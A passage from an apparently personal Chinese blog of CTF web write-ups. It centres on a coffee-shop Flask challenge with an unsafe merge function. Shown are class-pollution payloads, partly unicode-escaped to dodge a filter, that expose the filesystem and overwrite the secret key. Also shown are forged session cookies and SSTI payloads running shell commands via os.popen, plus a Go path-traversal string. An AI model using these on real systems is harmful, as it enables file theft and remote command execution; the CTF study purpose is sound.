class="string">&quot;2.png&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;id&quot;</span>: <span class="number">3</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;摩卡&quot;</span>, <span class="string">&quot;price&quot;</span>: <span class="number">29.99</span>, <span class="string">&quot;image&quot;</span>: <span class="string">&quot;3.png&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;id&quot;</span>: <span class="number">4</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;卡布奇诺&quot;</span>, <span class="string">&quot;price&quot;</span>: <span class="number">19.99</span>, <span class="string">&quot;image&quot;</span>: <span class="string">&quot;4.png&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;id&quot;</span>: <span class="number">5</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;冰拿铁&quot;</span>, <span class="string">&quot;price&quot;</span>: <span class="number">29.99</span>, <span class="string">&quot;image&quot;</span>: <span class="string">&quot;5.png&quot;</span>&#125;</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,</span><br><span class="line">                         error_message=error_message,</span><br><span class="line">                         session=session,</span><br><span class="line">                         products=products)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/add&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">adddd</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;html&gt;</span></span><br><span class="line"><span class="string">                &lt;body style=&quot;background-image: url(&#x27;/static/img/7.png&#x27;); background-size: cover; background-repeat: no-repeat;&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;h2&gt;添加商品&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                    &lt;form id=&quot;productForm&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;商品名称: &lt;input type=&quot;text&quot; id=&quot;name&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;商品价格: &lt;input type=&quot;text&quot; id=&quot;price&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                        &lt;button type=&quot;button&quot; onclick=&quot;submitForm()&quot;&gt;添加商品&lt;/button&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                    &lt;script&gt;</span></span><br><span class="line"><span class="string">                        function submitForm() &#123;</span></span><br><span class="line"><span class="string">                            const nameInput = document.getElementById(&#x27;name&#x27;).value;</span></span><br><span class="line"><span class="string">                            const priceInput = document.getElementById(&#x27;price&#x27;).value;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            fetch(`/add?price=$&#123;encodeURIComponent(priceInput)&#125;`, &#123;</span></span><br><span class="line"><span class="string">                                method: &#x27;POST&#x27;,</span></span><br><span class="line"><span class="string">                                headers: &#123;</span></span><br><span class="line"><span class="string">                                    &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,</span></span><br><span class="line"><span class="string">                                &#125;,</span></span><br><span class="line"><span class="string">                                body: nameInput</span></span><br><span class="line"><span class="string">                            &#125;)</span></span><br><span class="line"><span class="string">                            .then(response =&gt; response.text())</span></span><br><span class="line"><span class="string">                            .then(data =&gt; alert(data))</span></span><br><span class="line"><span class="string">                            .catch(error =&gt; console.error(&#x27;错误:&#x27;, error));</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                    &lt;/script&gt;</span></span><br><span class="line"><span class="string">                &lt;/body&gt;</span></span><br><span class="line"><span class="string">            &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.data:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                raw_data = request.data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> check(raw_data):</span><br><span class="line">                <span class="comment">#检测添加的商品是否合法</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;该商品违规，无法上传&quot;</span></span><br><span class="line">                json_data = json.loads(raw_data)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(json_data, <span class="built_in">dict</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;添加失败1&quot;</span></span><br><span class="line"></span><br><span class="line">                merge(json_data, add)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;你无法添加商品哦&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> (UnicodeDecodeError, json.JSONDecodeError):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;添加失败2&quot;</span></span><br><span class="line">            <span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;添加失败3&quot;</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;添加失败4&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;添加失败5&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5014</span>)</span><br></pre></td></tr></table></figure>

<p><strong>还有一个<code>HTML</code>：</strong></p>
<p><img src="/../images/image-20250608164238814-1749372160276-1.png" alt="image-20250608164238814"></p>
<p>看起来<strong>像模板注入</strong>？</p>
<p>猜测是<strong>上传名字</strong>然后<strong>对名字进行渲染</strong>，达到SSTI目的！！！</p>
<h3 id="打开-add页面查看："><a href="#打开-add页面查看：" class="headerlink" title="打开&#x2F;add页面查看："></a>打开&#x2F;add页面查看：</h3><p><img src="/../images/image-20250608172830753-1749374911958-3.png" alt="image-20250608172830753"></p>
<p><strong>难不成要鉴权？</strong></p>
<p>去哪里<strong>找到<code>key</code>来进行越权</strong>呢？</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">污染让他可以文件读取：</span><br><span class="line">&#123;&quot;__globals__&quot;:&#123;&quot;app&quot;:&#123;&quot;_static_folder&quot;:&quot;/&quot;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">污染黑名单：</span><br><span class="line">&#123;&quot;__globals__&quot; : &#123;&quot;param_black_list&quot; : [&quot;123&quot;]&#125;&#125;</span><br><span class="line"></span><br><span class="line">污染密钥来伪造：</span><br><span class="line">&#123;&quot;__globals__&quot; : &#123;&quot;app&quot; : &#123;&quot;config&quot; : &#123;&quot;SECRET_KEY&quot;:&quot;123&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="文件任意读取："><a href="#文件任意读取：" class="headerlink" title="文件任意读取："></a>文件任意读取：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__globals__&quot;</span>:&#123;<span class="string">&quot;app&quot;</span>:&#123;<span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;/&quot;</span>&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>: </span><br><span class="line">&#123;<span class="string">&quot;\u0061\u0070\u0070&quot;</span>: </span><br><span class="line">&#123;<span class="string">&quot;\u005f\u0073\u0074\u0061\u0074\u0069\u0063\u005f\u0066\u006f\u006c\u0064\u0065\u0072&quot;</span>: <span class="string">&quot;\u002f&quot;</span>&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#应用的静态文件存储路径被配置为根目录/，只要输入就能任意读取文件</span></span><br><span class="line">eg：/static/proc/<span class="number">1</span>/environ</span><br></pre></td></tr></table></figure>



<h4 id="伪造admin"><a href="#伪造admin" class="headerlink" title="伪造admin"></a>伪造admin</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__globals__&quot;</span> : &#123;<span class="string">&quot;param_black_list&quot;</span> : [<span class="string">&quot;123&quot;</span>]&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span> : </span><br><span class="line">&#123;<span class="string">&quot;\u0070\u0061\u0072\u0061\u006d\u005f\u0062\u006c\u0061\u0063\u006b\u005f\u006c\u0069\u0073\u0074&quot;</span> : [<span class="string">&quot;123&quot;</span>]&#125;&#125;</span><br><span class="line"> &#123;<span class="string">&quot;__globals__&quot;</span> : &#123;<span class="string">&quot;app&quot;</span> : &#123;<span class="string">&quot;config&quot;</span> : &#123;<span class="string">&quot;SECRET_KEY&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;&#125;&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span> : </span><br><span class="line">&#123;<span class="string">&quot;\u0061\u0070\u0070&quot;</span> : &#123;<span class="string">&quot;\u0063\u006f\u006e\u0066\u0069\u0067&quot;</span> : </span><br><span class="line">&#123;<span class="string">&quot;\u0053\u0045\u0043\u0052\u0045\u0054\u005f\u004b\u0045\u0059&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;&#125;&#125;&#125;</span><br><span class="line"> /aaadminnn</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;permission&#x27;</span>: </span><br><span class="line"><span class="string">&#x27;&#123;&#123;self.__init__.__globals__.__builtins__[&quot;__import__&quot;](&quot;os&quot;).popen(&quot;ls </span></span><br><span class="line"><span class="string">/&quot;).read()&#125;&#125;&#x27;</span>&#125;</span><br><span class="line"> .eJwdisEJwzAMAFcpeiWhZICuEhejNEoQ2JKx3Jfx7lH7uzuug2AmeAEemQWeUKhmNmMVj70bpXONkYVbjA5X0h2T_Xn_cmosLlsAf3LR6leA9xRALcC8Fi0kbh9sj-VcfqkSHtM8BowbvmMq</span><br><span class="line">g.aEUwzg.mBiuRSOKBMNSSPfGUTg8XAVIJT0</span><br></pre></td></tr></table></figure>

<p><strong>成功黑掉之后就可以访问： <code>/aaadminnn</code>   管理员页面</strong>（也不知道怎么得到的就是了）</p>
<h4 id="不知道为什么，我的测试老是失败。。。。。"><a href="#不知道为什么，我的测试老是失败。。。。。" class="headerlink" title="不知道为什么，我的测试老是失败。。。。。"></a>不知道为什么，我的测试老是失败。。。。。</h4><h5 id="又tm忘记加：Content-Type-application-json"><a href="#又tm忘记加：Content-Type-application-json" class="headerlink" title="又tm忘记加：Content-Type: application&#x2F;json"></a>又tm忘记加：Content-Type: application&#x2F;json</h5><h4 id="直接读取文件，读取出密钥不就好了？"><a href="#直接读取文件，读取出密钥不就好了？" class="headerlink" title="直接读取文件，读取出密钥不就好了？"></a>直接读取文件，读取出密钥不就好了？</h4><p>才发现原来<strong>已经改完改为<code>123</code>了</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>,methods=[<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    session[<span class="string">&quot;name&quot;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    session[<span class="string">&quot;permission&quot;</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> request.full_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_admin</span>():</span><br><span class="line">    <span class="comment"># 设置多个字段以匹配标准结构</span></span><br><span class="line">    session.permanent = <span class="literal">False</span></span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    session[<span class="string">&#x27;_fresh&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">    session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">    session[<span class="string">&#x27;data&#x27;</span>] = &#123;<span class="string">&#x27; b&#x27;</span>: <span class="string">&#x27;MTEx&#x27;</span>&#125;</span><br><span class="line">    session[<span class="string">&#x27;url&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>                                           <span class="comment">#多种多样，设置你想设置的cookie配置</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回真实 session 值</span></span><br><span class="line">    <span class="keyword">return</span> request.full_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJuYW1lIjoiYWRtaW4iLCJwZXJtaXNzaW9uIjoiMSJ9.aEWKBQ.bvMjdWRm4511D6j7aMYiRFCZeL4</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20250608211206428-1749388327138-5.png" alt="image-20250608211206428"></p>
<h4 id="答案做法："><a href="#答案做法：" class="headerlink" title="答案做法："></a>答案做法：</h4><h5 id="发现有出现：Your-permissions-are1"><a href="#发现有出现：Your-permissions-are1" class="headerlink" title="发现有出现：Your permissions are1"></a>发现有出现：Your permissions are1</h5><p>在<code>permission</code>中<strong>插入SSTI</strong></p>
<p><img src="/../images/image-20250608211800919-1749388682471-7.png" alt="image-20250608211800919"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJwdikEKwzAMwL4yfHEKo7vvK6WElHrD4Ngh7k4hf5_pTRIaoKUSvKGclRWe0KhXdmfTiGM4yWfNmZWvnAO-YkcRv_n4sVysIRvGUpv1mHBPaI7L2qyRJhR_vMI6lTMtc8L8A0FwKAw.aEWNkg.M19aykofdiulw8ZZpaaAO33ElJs</span><br></pre></td></tr></table></figure>

<p><strong>成功渲染：</strong></p>
<p><img src="/../images/image-20250608211845908-1749388726660-9.png" alt="image-20250608211845908"></p>
<h4 id="一个一个找："><a href="#一个一个找：" class="headerlink" title="一个一个找："></a>一个一个找：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session[<span class="string">&quot;permission&quot;</span>] = <span class="string">&quot;&#123;&#123;self.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /app/4flloog&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">.eJwdikEKwzAMBL9SdLEDJbn01K-UYpTGCQJZErZ7Mv57RW-zOzNAsGR4Ah6FBO5guRZqjVT8HKNlPteUSKin5HCx7sjtz_uXuJP4eAVPimn1KLxj0BaW1dSyxPDBftvQbHuczKqXm5rxiMucMH9I-iyM.aEWPjw.TwCQ0Xjtllo0J1VC1_AEJptae1c</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20250608212759406-1749389280579-11.png" alt="image-20250608212759406"></p>
<h4 id="也可以直接指令找："><a href="#也可以直接指令找：" class="headerlink" title="也可以直接指令找："></a>也可以直接指令找：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session[<span class="string">&quot;permission&quot;</span>] = <span class="string">&quot;&#123;&#123;self.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;find / -iname \&quot;*fl*\&quot;&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">.eJwdjcEKwyAQRH9F9rImtOm9v9IUMbiWBV1F05P479n29mbmwQwQnwme4ENmgRtUapl75yJajtEpxc05Fj6dU_ikcvjU_3x8OZ0sGl6oSq6lqYRvi6XjstVSSSxGlmAe5s6_I7PDGtO6g-6NfLDLnDAvRfAtZw.aEWQUw<span class="number">.2j</span>FoNWNd_0u-UIupu0Qhtiw1x40</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20250608213220020-1749389540702-13.png" alt="image-20250608213220020"></p>
<h2 id="Watch"><a href="#Watch" class="headerlink" title="Watch"></a>Watch</h2><h5 id="答案说是Go语言，怎么看出来的？"><a href="#答案说是Go语言，怎么看出来的？" class="headerlink" title="答案说是Go语言，怎么看出来的？"></a>答案说是Go语言，怎么看出来的？</h5><p>通过<strong>Go语言</strong>的版本来查出<strong>CVE漏洞</strong>：<strong>CVE-2023-45283</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../\??\D:\key.txt</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      
      
      
      
      
      
      
      

    </footer>
  </div>
  
    
  <nav id="article-nav" data-aos="fade-up">
    
      <div class="article-nav-link-wrap article-nav-link-left">
        
          
          
            <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/ruime%20and%20sakuya.jpg" data-sizes="auto" alt="Sql" class="lazyload">
          
        
        <a href="/2025/06/13/Sql/"></a>
        <div class="article-nav-caption">Newer</div>
        <h3 class="article-nav-title">
          
            Sql
          
        </h3>
      </div>
    
    
    <div class="article-nav-link-wrap article-nav-link-right">
      
        
        
          <img data-src="/covers/妹红02.jpg" data-sizes="auto" alt="我的渗透日记" class="lazyload">
        
      
      <a href="/2025/06/06/%E6%88%91%E7%9A%84%E6%B8%97%E9%80%8F%E6%97%A5%E8%AE%B0/"></a>
      <div class="article-nav-caption">Older</div>
      <h3 class="article-nav-title">
        
          我的渗透日记
        
      </h3>
    </div>
    
  </nav>


  
</article>






</section>
          
            <aside id="sidebar">
  <div class="sidebar-wrapper wrap-sticky">
    <div class="sidebar-wrap" data-aos="fade-up">
      
        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B2%A1%E6%89%93%E7%AE%97%E8%AE%A4%E7%9C%9F%E5%86%99%EF%BC%8C%E7%A8%8D%E5%BE%AE%E5%86%99%E4%B8%80%E7%82%B9%E4%BF%9D%E6%8C%81%E6%89%8B%E6%84%9F%E5%90%A7%EF%BC%81%EF%BC%81"><span class="toc-number">1.0.0.0.1.</span> <span class="toc-text">没打算认真写，稍微写一点保持手感吧！！</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DeceptiFlag"><span class="toc-number">1.1.</span> <span class="toc-text">DeceptiFlag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">测试：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%B7%E5%BA%B7%E6%BA%90%E7%A0%81%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">康康源码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%8F%E8%BF%87%E4%B8%8D%E6%96%AD%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="toc-number">1.1.3.</span> <span class="toc-text">经过不断测试：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%9A"><span class="toc-number">1.1.4.</span> <span class="toc-text">文件读取：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Really-Ez-Rce"><span class="toc-number">2.</span> <span class="toc-text">Really_Ez_Rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.0.1.</span> <span class="toc-text">考察点：代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%EF%BC%9A"><span class="toc-number">2.0.2.</span> <span class="toc-text">源码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87preg-match-d-inputNumber"><span class="toc-number">2.0.3.</span> <span class="toc-text">绕过preg_match(&#39;&#x2F;\d&#x2F;&#39;, $inputNumber)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%EF%BC%9Acmd%E7%9A%84WAF"><span class="toc-number">2.0.4.</span> <span class="toc-text">绕过：cmd的WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%EF%BC%9A-1"><span class="toc-number">2.0.4.1.</span> <span class="toc-text">测试：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp%EF%BC%9A"><span class="toc-number">2.0.5.</span> <span class="toc-text">exp：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">2.0.5.1.</span> <span class="toc-text">法一：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">2.0.5.1.1.</span> <span class="toc-text">拼接绕过：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">2.0.5.2.</span> <span class="toc-text">法二：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%82%B9%E6%92%87%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">2.0.5.2.1.</span> <span class="toc-text">点撇绕过：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%89%EF%BC%9A"><span class="toc-number">2.0.5.3.</span> <span class="toc-text">法三：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84%E5%92%96%E5%95%A1%E5%BA%97"><span class="toc-number">2.1.</span> <span class="toc-text">奇怪的咖啡店</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9A%E6%B1%A1%E6%9F%93%E9%A2%98"><span class="toc-number">2.1.1.</span> <span class="toc-text">考察点：污染题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%BC%80-add%E9%A1%B5%E9%9D%A2%E6%9F%A5%E7%9C%8B%EF%BC%9A"><span class="toc-number">2.1.2.</span> <span class="toc-text">打开&#x2F;add页面查看：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.1.3.</span> <span class="toc-text">exp:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%EF%BC%9A"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">文件任意读取：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0admin"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">伪造admin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E7%9F%A5%E9%81%93%E4%B8%BA%E4%BB%80%E4%B9%88%EF%BC%8C%E6%88%91%E7%9A%84%E6%B5%8B%E8%AF%95%E8%80%81%E6%98%AF%E5%A4%B1%E8%B4%A5%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82"><span class="toc-number">2.1.3.3.</span> <span class="toc-text">不知道为什么，我的测试老是失败。。。。。</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%88tm%E5%BF%98%E8%AE%B0%E5%8A%A0%EF%BC%9AContent-Type-application-json"><span class="toc-number">2.1.3.3.1.</span> <span class="toc-text">又tm忘记加：Content-Type: application&#x2F;json</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%EF%BC%8C%E8%AF%BB%E5%8F%96%E5%87%BA%E5%AF%86%E9%92%A5%E4%B8%8D%E5%B0%B1%E5%A5%BD%E4%BA%86%EF%BC%9F"><span class="toc-number">2.1.3.4.</span> <span class="toc-text">直接读取文件，读取出密钥不就好了？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%E5%81%9A%E6%B3%95%EF%BC%9A"><span class="toc-number">2.1.3.5.</span> <span class="toc-text">答案做法：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E6%9C%89%E5%87%BA%E7%8E%B0%EF%BC%9AYour-permissions-are1"><span class="toc-number">2.1.3.5.1.</span> <span class="toc-text">发现有出现：Your permissions are1</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E4%B8%80%E4%B8%AA%E6%89%BE%EF%BC%9A"><span class="toc-number">2.1.3.6.</span> <span class="toc-text">一个一个找：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%8C%87%E4%BB%A4%E6%89%BE%EF%BC%9A"><span class="toc-number">2.1.3.7.</span> <span class="toc-text">也可以直接指令找：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Watch"><span 